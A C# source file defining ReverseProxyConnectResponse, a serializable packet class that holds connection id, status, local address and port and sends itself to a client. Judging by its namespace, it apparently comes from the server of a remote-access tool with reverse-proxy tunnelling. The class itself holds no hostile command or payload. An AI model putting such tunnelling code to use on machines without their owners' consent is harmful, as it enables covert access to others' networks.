using System;
using System.Net;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler;

namespace xServer.KuuhakuCekirdek.ReverseProxy.Packets
{
    [Serializable]
    public class ReverseProxyConnectResponse : IPacket
    {
        public int ConnectionId { get; set; }

        public bool IsConnected { get; set; }

        public IPAddress LocalAddress { get; set; }

        public int LocalPort { get; set; }

        public string HostName { get; set; }

        public ReverseProxyConnectResponse(int connectionId, bool isConnected, IPAddress localAddress, int localPort)
        {
            this.ConnectionId = connectionId;
            this.IsConnected = isConnected;
            this.LocalAddress = localAddress;
            this.LocalPort = localPort;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
